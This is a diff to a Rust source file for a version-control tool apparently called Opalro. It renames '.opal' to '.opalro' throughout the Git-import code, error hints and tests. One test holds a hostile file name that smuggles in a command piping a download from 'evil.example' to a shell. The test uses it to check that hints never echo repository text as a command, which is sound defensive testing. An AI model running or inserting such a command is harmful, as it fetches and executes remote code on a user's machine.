@@ -1,4 +1,4 @@
-//! Importing a Git repository into Opalro (milestone 2): `import_git`, the whole of `opal import`,
+//! Importing a Git repository into Opalro (milestone 2): `import_git`, the whole of `opalro import`,
 //! and why an import stops; in `names`, the names refs take in Opalro; in `convert`, how Git's
 //! objects become Opalro's.
 #![deny(clippy::indexing_slicing, clippy::arithmetic_side_effects)]
@@ -109,7 +109,7 @@ pub struct Renaming {
     /// Git's name; a server line's is `<server>/<branch>`, as Git shows it.
     pub git: String,
     /// Opalro's name; a server line's is `<line>@<server>`, as Opalro shows it.
-    pub opal: String,
+    pub opalro: String,
 }
 
 /// Why an import stops. Text from the repository is shown escaped.
@@ -165,7 +165,7 @@ pub enum ImportError {
         commit: String,
         path: String,
     },
-    /// The import stopped after it began the project, before `format`: the `.opal` it began
+    /// The import stopped after it began the project, before `format`: the `.opalro` it began
     /// stays, for a later run to finish from what it stored (decision 041). `committed`: it holds
     /// a head, whose entry may hold the whole import.
     #[error("{stop}")]
@@ -186,14 +186,14 @@ impl ImportError {
             ImportError::Unfinished { stop: e, committed } => {
                 // Deleting is offered only while no head was written.
                 let kept = if *committed {
-                    "The import's history is stored, but the .opal folder isn't a finished project \
-                     yet. Run opal import again here to finish it from what was stored."
+                    "The import's history is stored, but the .opalro folder isn't a finished project \
+                     yet. Run opalro import again here to finish it from what was stored."
                 } else if e.may_pass_when_run_again() {
-                    "Nothing was committed. Opalro kept the .opal folder it began here, so that \
-                     running opal import again can finish the import from what it stored; or \
+                    "Nothing was committed. Opalro kept the .opalro folder it began here, so that \
+                     running opalro import again can finish the import from what it stored; or \
                      delete that folder."
                 } else {
-                    "Nothing was committed. Opalro kept the .opal folder it began here: opal import \
+                    "Nothing was committed. Opalro kept the .opalro folder it began here: opalro import \
                      stops the same way until the cause is fixed, then finishes from what it \
                      stored. Or delete that folder."
                 };
@@ -214,7 +214,7 @@ impl ImportError {
             ImportError::Stop { hint, .. } => hint.clone(),
             ImportError::NotUtf8Names { .. } => Some(
                 "Nothing was changed. Rename them in the Git history to names in UTF-8, then run \
-                 opal import again."
+                 opalro import again."
                     .to_owned(),
             ),
             ImportError::LfsMissing {
@@ -222,7 +222,7 @@ impl ImportError {
             } => {
                 let mut hint = format!(
                     "{NOTHING_CHANGED} Download every version Git LFS keeps with `git lfs fetch \
-                     --all`, then run opal import again. Opalro reads a Git LFS file only from \
+                     --all`, then run opalro import again. Opalro reads a Git LFS file only from \
                      .git/lfs/objects, as a plain file of the size its pointer gives, never \
                      through a link."
                 );
@@ -245,21 +245,21 @@ impl ImportError {
             ImportError::LfsMismatch { commit, .. } => Some(format!(
                 "{NOTHING_CHANGED} Git LFS's copy is damaged or was replaced: run `git lfs fsck \
                  {}`, which moves a bad copy to .git/lfs/bad, then `git lfs fetch --all` to \
-                 download it again, and run opal import again.",
+                 download it again, and run opalro import again.",
                 escape(commit, false)
             )),
             // `migrate export` runs the extensions' programs, as a checkout does.
             ImportError::LfsExtension { .. } => Some(format!(
                 "{NOTHING_CHANGED} Turn the Git LFS files back into ordinary Git files in a copy \
                  of the repository with `git lfs migrate export --everything --include=\"*\"`, \
-                 which rewrites its history, then run opal import in that copy."
+                 which rewrites its history, then run opalro import in that copy."
             )),
             ImportError::LfsElsewhere {
                 kept: LfsElsewhere::Storage { .. },
                 ..
             } => Some(format!(
                 "{NOTHING_CHANGED} Remove that setting, or set it to lfs, download the files into \
-                 .git/lfs/objects with `git lfs fetch --all`, then run opal import again."
+                 .git/lfs/objects with `git lfs fetch --all`, then run opalro import again."
             )),
             ImportError::LfsElsewhere {
                 kept: LfsElsewhere::Linked { folder },
@@ -267,7 +267,7 @@ impl ImportError {
             } => Some(format!(
                 "{NOTHING_CHANGED} Put a real folder at {}, holding what a link there points to, \
                  or remove what is there and download the files with `git lfs fetch --all`, then \
-                 run opal import again.",
+                 run opalro import again.",
                 escape(folder, false)
             )),
         }
@@ -431,10 +431,10 @@ fn not_utf8_message(first: &[(String, String)], count: u64) -> String {
 
 /// Imports the Git repository whose work tree is `root` into a new Opalro project there (decisions
 /// 033, 034 and 040): every commit its branches, server branches, tags and `HEAD` reach becomes a
-/// save. Everything that only reads comes first, so most refusals come before `.opal` is made.
+/// save. Everything that only reads comes first, so most refusals come before `.opalro` is made.
 /// The project goes into `opened` as soon as it is begun, so a caller can show what its store
 /// noticed even if the import then fails. Nothing is committed until the last step writes
-/// `.opal/format`, and running it again once the cause of an earlier failure is gone finishes the
+/// `.opalro/format`, and running it again once the cause of an earlier failure is gone finishes the
 /// job, reusing what was stored once it is checked (decision 041).
 pub fn import_git(
     root: &Path,
@@ -449,7 +449,7 @@ pub fn import_git(
 }
 
 /// `begin`'s failure, as an import says it. A refusal says what is wrong with the folder, as
-/// before anything is made; any other failure comes once `.opal` may be made.
+/// before anything is made; any other failure comes once `.opalro` may be made.
 fn begun(root: &Path, e: RepoError) -> ImportError {
     match e {
         RepoError::AlreadyAProject { .. }
@@ -466,13 +466,13 @@ fn begun(root: &Path, e: RepoError) -> ImportError {
     }
 }
 
-/// `e`, met once the project may be begun, as an import says it. While a real `.opal` is there
+/// `e`, met once the project may be begun, as an import says it. While a real `.opalro` is there
 /// without `format`, the project isn't made and the folder stays for a run to finish, noting
 /// whether it holds a head. With `format`, the project was made and only the flush after it
-/// failed; with no `.opal`, there is nothing to keep. Either way `e` is said as it is.
+/// failed; with no `.opalro`, there is nothing to keep. Either way `e` is said as it is.
 fn after_begin(root: &Path, e: ImportError) -> ImportError {
-    let opal = safe_fs::check_real_dir(&root.join(".opal")).is_ok();
-    if opal && matches!(repo::has_format(root), Ok(false)) {
+    let opalro = safe_fs::check_real_dir(&root.join(".opalro")).is_ok();
+    if opalro && matches!(repo::has_format(root), Ok(false)) {
         ImportError::Unfinished {
             stop: Box::new(e),
             committed: repo::has_head(root),
@@ -525,7 +525,7 @@ fn plan(
     let roots = roots(&git, &refs, &names.tags, &mut tag_budget)?;
     if roots.is_empty() {
         return Err(ImportError::Stop {
-            what: "There's nothing to import: this Git repository has no commits. opal start \
+            what: "There's nothing to import: this Git repository has no commits. opalro start \
                    makes a new project here."
                 .to_owned(),
             hint: None,
@@ -533,7 +533,7 @@ fn plan(
     }
     let (head_line, head_commit) = match &refs.head {
         Head::Branch(branch) => match names.lines.iter().find(|line| line.git == *branch) {
-            Some(line) => (Some(line.opal.clone()), line.target),
+            Some(line) => (Some(line.opalro.clone()), line.target),
             None => return Err(unborn(branch)),
         },
         Head::Detached(id) => (None, *id),
@@ -601,12 +601,12 @@ fn carry_out(
     // Each tag goes into the list as it is read, in the list's order, and is let go: the tags
     // are never held whole beside the list.
     let mut in_list_order: Vec<&Named> = names.tags.iter().collect();
-    in_list_order.sort_by(|a, b| a.opal.cmp(&b.opal));
+    in_list_order.sort_by(|a, b| a.opalro.cmp(&b.opalro));
     let mut tag_list = TagListWriter::with_capacity(tag_list_len);
     let mut skipped_tags = Vec::new();
     for tag in in_list_order {
-        match converter.tag(&tag.opal, &tag.target)? {
-            TagOutcome::Tag(kept) => tag_list.push(&tag.opal, &kept),
+        match converter.tag(&tag.opalro, &tag.target)? {
+            TagOutcome::Tag(kept) => tag_list.push(&tag.opalro, &kept),
             TagOutcome::Skipped { reason } => skipped_tags.push((lossy(&tag.git), reason)),
         }
     }
@@ -717,7 +717,7 @@ fn carry_out(
     Ok(report)
 }
 
-/// `check_new`'s refusal of `root`, as an import says it. A `.opal` that Git checked out makes it
+/// `check_new`'s refusal of `root`, as an import says it. A `.opalro` that Git checked out makes it
 /// refuse for the wrong reason (a project already, another tool's folder, damage), so then the
 /// import says that Git tracks it.
 fn refused(root: &Path, e: RepoError) -> ImportError {
@@ -733,7 +733,7 @@ fn refused(root: &Path, e: RepoError) -> ImportError {
     starting(e)
 }
 
-/// The name of a `.opal` entry Git tracks at the top of the commit `root`'s Git repository is
+/// The name of a `.opalro` entry Git tracks at the top of the commit `root`'s Git repository is
 /// on, if Opalro can read the repository to tell. It only reads, as `plan` does.
 fn tracked_at(root: &Path) -> Option<String> {
     let git = git::Repo::open(root).ok()?;
@@ -749,17 +749,18 @@ fn tracked_at(root: &Path) -> Option<String> {
 fn starting(e: RepoError) -> ImportError {
     match e {
         RepoError::AlreadyAProject { .. } => ImportError::Stop {
-            what: "This folder is already an Opalro project. Picking up new Git commits comes in a \
+            what:
+                "This folder is already an Opalro project. Picking up new Git commits comes in a \
                    later version."
-                .to_owned(),
+                    .to_owned(),
             hint: Some(
-                "To import the Git repository again, run opal import in a fresh clone of it."
+                "To import the Git repository again, run opalro import in a fresh clone of it."
                     .to_owned(),
             ),
         },
-        // Its own hint says to run `opal start` again, which would make an empty project.
+        // Its own hint says to run `opalro start` again, which would make an empty project.
         RepoError::StartStopped { refusal } => {
-            let hint = refusal.hint_then("Then run opal import again to finish.");
+            let hint = refusal.hint_then("Then run opalro import again to finish.");
             let what = RepoError::StartStopped { refusal }.to_string();
             ImportError::Stop { what, hint }
         }
@@ -776,7 +777,7 @@ fn unborn(branch: &[u8]) -> ImportError {
             shown(branch)
         ),
         hint: Some(
-            "Nothing was changed. Run opal import again once Git's current branch has commits."
+            "Nothing was changed. Run opalro import again once Git's current branch has commits."
                 .to_owned(),
         ),
     }
@@ -816,7 +817,7 @@ fn roots(
     }
     let mut seen: HashMap<GitId, Seen> = HashMap::new();
     for tag in tags {
-        let name = tag.opal.as_str();
+        let name = tag.opalro.as_str();
         budget.room_for(name)?;
         // Each tag object read for this tag, its size and its message's length.
         let mut read: Vec<(GitId, usize, usize)> = Vec::new();
@@ -952,7 +953,8 @@ impl FirstPass<'_> {
             return Ok(index);
         }
         let index = u32::try_from(self.ids.len()).map_err(|_| ImportError::Stop {
-            what: "This Git history has more commits than Opalro can count in one import.".to_owned(),
+            what: "This Git history has more commits than Opalro can count in one import."
+                .to_owned(),
             hint: None,
         })?;
         self.ids.push(id);
@@ -1041,7 +1043,7 @@ fn lines_of(
     refs: &[Named],
 ) -> Result<BTreeMap<String, Id>, ImportError> {
     refs.iter()
-        .map(|line| Ok((line.opal.clone(), converter.save_of(&line.target)?)))
+        .map(|line| Ok((line.opalro.clone(), converter.save_of(&line.target)?)))
         .collect()
 }
 
@@ -1062,7 +1064,8 @@ fn put_record(
     } else {
         "server-lines list"
     };
-    read_back(encoded).map_err(|e| bug(format!("Opalro made a {what} it can't read back ({e})")))?;
+    read_back(encoded)
+        .map_err(|e| bug(format!("Opalro made a {what} it can't read back ({e})")))?;
     let flavor = kind
         .flavor()
         .ok_or_else(|| bug(format!("Opalro took a {what} for content")))?;
@@ -1074,29 +1077,29 @@ fn put_record(
     Ok(id)
 }
 
-/// The stop for an entry `name` spelled `.opal` that Git tracks at the top. The name comes from
+/// The stop for an entry `name` spelled `.opalro` that Git tracks at the top. The name comes from
 /// the repository, so it is only ever shown escaped, never put in a command: one spelling, such
-/// as `.opal:$(…)`, can hold anything but `/`.
+/// as `.opalro:$(…)`, can hold anything but `/`.
 fn tracked_stop(name: &str) -> ImportError {
-    let hint = if name == ".opal" {
+    let hint = if name == ".opalro" {
         "Nothing was changed. Opalro reads the commit Git is on, so the folder has to leave it: \
-         rename it with `git mv` and commit, or run `git rm -r --cached .opal`, commit, and move \
-         the folder elsewhere. Then run opal import again."
+         rename it with `git mv` and commit, or run `git rm -r --cached .opalro`, commit, and move \
+         the folder elsewhere. Then run opalro import again."
     } else {
         "Nothing was changed. Opalro reads the commit Git is on, so the entry named above has to \
          leave it: rename it or remove it in Git and commit, and move it out of this folder if it \
-         is still here. Then run opal import again."
+         is still here. Then run opalro import again."
     };
     ImportError::Stop {
         what: format!(
             "Git tracks `{name}` at the top of this project, and Opalro can't use it as its own \
-             .opal folder."
+             .opalro folder."
         ),
         hint: Some(hint.to_owned()),
     }
 }
 
-/// The name of an entry spelled `.opal` at the top of the tree of `HEAD`'s commit, of any kind,
+/// The name of an entry spelled `.opalro` at the top of the tree of `HEAD`'s commit, of any kind,
 /// if Git tracks one: Git checks it out where Opalro keeps the project, and Opalro never takes files
 /// Git wrote for its own.
 fn tracked_opal(git: &git::Repo, head: &GitId) -> Result<Option<String>, ImportError> {
@@ -1312,7 +1315,7 @@ fn kept_entries(
         .collect())
 }
 
-/// A warning for each folder named `.opal` that Git checked out below the top, from the tree of
+/// A warning for each folder named `.opalro` that Git checked out below the top, from the tree of
 /// `HEAD`'s commit: Opalro left them out of history, but commands run inside one would take it for
 /// a project (decision 019). `tracked_opal` found none at the top.
 fn opal_folder_warnings(git: &git::Repo, head: &GitId) -> Result<Vec<Warning>, ImportError> {
@@ -1334,12 +1337,12 @@ fn opal_folder_warnings(git: &git::Repo, head: &GitId) -> Result<Vec<Warning>, I
                 let mut path: Vec<&str> = stack.iter().skip(1).map(|(n, _)| n.as_str()).collect();
                 path.push(&name);
                 let message = format!(
-                    "Git checked out a folder named .opal at `{}`. Opalro left it out of history, \
+                    "Git checked out a folder named .opalro at `{}`. Opalro left it out of history, \
                      but commands run inside it would use it as an Opalro project; delete it unless \
                      you made it.",
                     escape(&shown_path(&path), false)
                 );
-                warnings.push(Warning::new(warning::NESTED_OPAL_FOLDER, message));
+                warnings.push(Warning::new(warning::NESTED_OPALRO_FOLDER, message));
             }
         } else if seen.insert(id) {
             let inner = subfolders(git, &id)?.into_iter();
@@ -1349,22 +1352,22 @@ fn opal_folder_warnings(git: &git::Repo, head: &GitId) -> Result<Vec<Warning>, I
     let more = count.saturating_sub(warnings.len() as u64);
     if more > 0 {
         let message = if more == 1 {
-            "Git checked out 1 more folder named .opal. Opalro left it out of history too; delete \
+            "Git checked out 1 more folder named .opalro. Opalro left it out of history too; delete \
              it unless you made it."
                 .to_owned()
         } else {
             format!(
-                "Git checked out {} more folders named .opal. Opalro left them out of history too; \
+                "Git checked out {} more folders named .opalro. Opalro left them out of history too; \
                  delete them unless you made them.",
                 thousands(more)
             )
         };
-        warnings.push(Warning::new(warning::NESTED_OPAL_FOLDER, message));
+        warnings.push(Warning::new(warning::NESTED_OPALRO_FOLDER, message));
     }
     Ok(warnings)
 }
 
-/// The folders in the Git tree `id` that saves keep, and those spelled `.opal`, which they leave
+/// The folders in the Git tree `id` that saves keep, and those spelled `.opalro`, which they leave
 /// out (`true`), as the converter judges their names.
 fn subfolders(git: &git::Repo, id: &GitId) -> Result<Vec<(String, GitId, bool)>, ImportError> {
     let place = || format!("tree `{}`", id.to_hex());
@@ -1448,13 +1451,13 @@ mod tests {
         one_commit(imported.path());
         import(imported.path()).unwrap();
         for dir in [started.path(), imported.path()] {
-            let format = std::fs::read_to_string(dir.join(".opal/format")).unwrap();
+            let format = std::fs::read_to_string(dir.join(".opalro/format")).unwrap();
             assert_eq!(format, "opal-repository 1\nhash blake3\nfeature chunks\n");
         }
     }
 
     /// The converter would refuse these tags only after every commit was converted; the first
-    /// pass refuses them alike, before `.opal` is made.
+    /// pass refuses them alike, before `.opalro` is made.
     #[test]
     fn tags_past_opals_limits_stop_the_import_before_anything_is_written() {
         // A chain of `objects` tag objects to `commit`, the one nearest it holding `message`.
@@ -1480,7 +1483,7 @@ mod tests {
                 }
                 other => panic!("{refusal}: {:?}", other.map(|_| ())),
             }
-            assert!(!dir.path().join(".opal").exists(), "{refusal}");
+            assert!(!dir.path().join(".opalro").exists(), "{refusal}");
         }
         // Sixteen tag objects are as many as Opalro keeps.
         let dir = tempfile::tempdir().unwrap();
@@ -1490,16 +1493,16 @@ mod tests {
         assert_eq!(import(dir.path()).unwrap().tags, 1);
     }
 
-    /// Any spelling of `.opal` the converter would leave out, of any kind, as long as Git tracks
+    /// Any spelling of `.opalro` the converter would leave out, of any kind, as long as Git tracks
     /// it at the top: here nothing is checked out, so only the tree shows it.
     #[test]
     fn a_opal_entry_git_tracks_at_the_top_stops_the_import() {
-        // A spelling a system takes for `.opal` can go on past a `:`, and hold a newline.
-        let hostile = ".opal:$(curl -s evil.example|sh)\nhint: paste me";
+        // A spelling a system takes for `.opalro` can go on past a `:`, and hold a newline.
+        let hostile = ".opalro:$(curl -s evil.example|sh)\nhint: paste me";
         for (name, mode) in [
-            (".opal", "100644"),
-            (".Opal.", "40000"),
-            ("OPAL~1", "120000"),
+            (".opalro", "100644"),
+            (".Opalro.", "40000"),
+            ("OPALRO~1", "120000"),
             (hostile, "100644"),
         ] {
             let dir = tempfile::tempdir().unwrap();
@@ -1525,12 +1528,12 @@ mod tests {
             assert!(message.starts_with(&what), "{message}");
             assert!(!message.contains('\n'), "{message}");
             // The hint is true (Opalro reads the commit, so the change is committed), and names no
-            // command made from the repository's text; only `.opal` itself gets one.
+            // command made from the repository's text; only `.opalro` itself gets one.
             assert!(hint.contains("and commit"), "{hint}");
             assert!(!hint.contains("$(") && !hint.contains("paste me"), "{hint}");
-            let rm = "`git rm -r --cached .opal`";
-            assert_eq!(hint.contains(rm), name == ".opal", "{hint}");
-            assert!(!dir.path().join(".opal").exists(), "{name}");
+            let rm = "`git rm -r --cached .opalro`";
+            assert_eq!(hint.contains(rm), name == ".opalro", "{hint}");
+            assert!(!dir.path().join(".opalro").exists(), "{name}");
         }
     }
 
@@ -1597,7 +1600,7 @@ mod tests {
             }
             other => panic!("{:?}", other.map(|_| ())),
         }
-        assert!(!dir.path().join(".opal").exists());
+        assert!(!dir.path().join(".opalro").exists());
     }
 
     /// Stores a commit of `tree` with `parents` and `message` in `git`.
@@ -1757,7 +1760,7 @@ mod tests {
                 }
                 other => panic!("{refusal}: {:?}", other.map(|_| ())),
             }
-            assert!(!dir.path().join(".opal").exists(), "{refusal}");
+            assert!(!dir.path().join(".opalro").exists(), "{refusal}");
         }
     }
 
@@ -1766,25 +1769,25 @@ mod tests {
         for (folders, last) in [
             (
                 101,
-                "Git checked out 1 more folder named .opal. Opalro left it out of history too; \
+                "Git checked out 1 more folder named .opalro. Opalro left it out of history too; \
                  delete it unless you made it.",
             ),
             (
                 102,
-                "Git checked out 2 more folders named .opal. Opalro left them out of history \
+                "Git checked out 2 more folders named .opalro. Opalro left them out of history \
                  too; delete them unless you made them.",
             ),
         ] {
             let dir = tempfile::tempdir().unwrap();
             let git = Craft::new(dir.path(), HashKind::Sha1);
             let blob = git.object(ObjectType::Blob, b"a\n");
-            let opal = git.tree(&[(b"100644", b"x", blob)]);
+            let opalro = git.tree(&[(b"100644", b"x", blob)]);
             // Each folder's tree its own, since each tree is looked at once.
             let folders: Vec<(Vec<u8>, GitId)> = (0..folders)
                 .map(|n| {
                     let own = git.object(ObjectType::Blob, format!("{n}\n").as_bytes());
                     let folder =
-                        git.tree(&[(b"40000", b".opal", opal), (b"100644", b"n.txt", own)]);
+                        git.tree(&[(b"40000", b".opalro", opalro), (b"100644", b"n.txt", own)]);
                     (format!("d{n:03}").into_bytes(), folder)
                 })
                 .collect();
@@ -1803,14 +1806,14 @@ mod tests {
             let warnings = opal_folder_warnings(&repo, &commit).unwrap();
             assert_eq!(warnings.len(), 101);
             assert!(
-                warnings[0].message.contains("at `d000/.opal`."),
+                warnings[0].message.contains("at `d000/.opalro`."),
                 "{warnings:?}"
             );
             assert_eq!(warnings[100].message, last);
         }
     }
 
-    /// Once `.opal` is begun, a stop says the folder is kept; but not when there's no `.opal` to
+    /// Once `.opalro` is begun, a stop says the folder is kept; but not when there's no `.opalro` to
     /// keep, nor when `format` was written and only the flush after it failed, since then the
     /// project is made.
     #[test]
@@ -1824,7 +1827,7 @@ mod tests {
             after_begin(dir.path(), stop()),
             ImportError::Stop { .. }
         ));
-        std::fs::create_dir(dir.path().join(".opal")).unwrap();
+        std::fs::create_dir(dir.path().join(".opalro")).unwrap();
         let kept = after_begin(dir.path(), stop());
         assert!(
             matches!(
@@ -1838,8 +1841,8 @@ mod tests {
         );
         assert!(kept.hint().unwrap().ends_with("Or delete that folder."));
         // Once a head is written its entry may hold the whole import: no deleting is offered.
-        std::fs::create_dir(dir.path().join(".opal/state")).unwrap();
-        std::fs::write(dir.path().join(".opal/state/head"), b"").unwrap();
+        std::fs::create_dir(dir.path().join(".opalro/state")).unwrap();
+        std::fs::write(dir.path().join(".opalro/state/head"), b"").unwrap();
         let kept = after_begin(dir.path(), stop());
         assert!(
             matches!(
@@ -1853,10 +1856,10 @@ mod tests {
         );
         let hint = kept.hint().unwrap();
         assert!(
-            hint.contains("Run opal import again here to finish it") && !hint.contains("delete"),
+            hint.contains("Run opalro import again here to finish it") && !hint.contains("delete"),
             "{hint}"
         );
-        std::fs::write(dir.path().join(".opal/format"), crate::repo::FORMAT_TEXT).unwrap();
+        std::fs::write(dir.path().join(".opalro/format"), crate::repo::FORMAT_TEXT).unwrap();
         assert!(matches!(
             after_begin(dir.path(), stop()),
             ImportError::Stop { .. }
@@ -1881,7 +1884,7 @@ mod tests {
         };
         let hint = hint_for(Path::new("/srv/work"));
         assert!(
-            hint.ends_with("\nThen run opal import again to finish."),
+            hint.ends_with("\nThen run opalro import again to finish."),
             "{hint}"
         );
         let folder = tempfile::tempdir().unwrap();
@@ -1954,16 +1957,16 @@ mod tests {
             "{stopped:?}"
         );
         assert!(!later.exists(), "the pack was removed");
-        assert!(!dir.path().join(".opal/format").exists());
-        // The `.opal` begun stays, for a run to finish, and the hint says so instead of saying
+        assert!(!dir.path().join(".opalro/format").exists());
+        // The `.opalro` begun stays, for a run to finish, and the hint says so instead of saying
         // that nothing was changed. The caller holds the project, to show what its store noticed.
         let hint = stopped.hint().unwrap();
         assert!(
-            hint.starts_with("Run opal import again once Git has finished."),
+            hint.starts_with("Run opalro import again once Git has finished."),
             "{hint}"
         );
         assert!(
-            hint.contains("Opalro kept the .opal folder it began"),
+            hint.contains("Opalro kept the .opalro folder it began"),
             "{hint}"
         );
         assert!(!hint.contains("Nothing was changed"), "{hint}");
@@ -2256,7 +2259,7 @@ mod tests {
         assert_eq!(checking, [(1, Some(2)), (2, Some(2))]);
     }
 
-    /// The `opal.toml` of the Git checkout an import runs in decides which files it cuts, and so
+    /// The `opalro.toml` of the Git checkout an import runs in decides which files it cuts, and so
     /// does a project's for the safety copies of a discard.
     #[test]
     fn safety_copies_and_imports_use_the_threshold_too() {
@@ -2283,10 +2286,10 @@ mod tests {
             let commit = git.commit(raw.as_bytes());
             git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
             if let Some(rules) = rules {
-                std::fs::write(dir.path().join("opal.toml"), rules).unwrap();
+                std::fs::write(dir.path().join("opalro.toml"), rules).unwrap();
             }
             import(dir.path()).unwrap();
-            let packs = std::fs::read_dir(dir.path().join(".opal/store/packs")).unwrap();
+            let packs = std::fs::read_dir(dir.path().join(".opalro/store/packs")).unwrap();
             let lists: usize = packs
                 .map(|p| p.unwrap().path())
                 .filter(|p| p.extension().is_some_and(|e| e == "pack"))
